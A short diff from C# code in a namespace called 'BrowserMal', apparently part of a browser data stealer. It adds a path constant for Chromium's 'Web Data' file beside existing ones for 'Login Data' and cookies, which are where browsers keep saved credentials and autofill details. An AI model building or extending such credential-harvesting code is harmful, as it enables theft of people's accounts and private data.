@@ -8,6 +8,7 @@ namespace BrowserMal.Browser
     {
 		public static readonly string LOGIN_DATA = "\\Login Data";
 		public static readonly string COOKIES = "\\Network\\Cookies";
+		public static readonly string WEB_DATA = "\\Web Data";
 
 		public static List<string> GetAllProfiles(string DirectoryPath, string pathType)
 		{
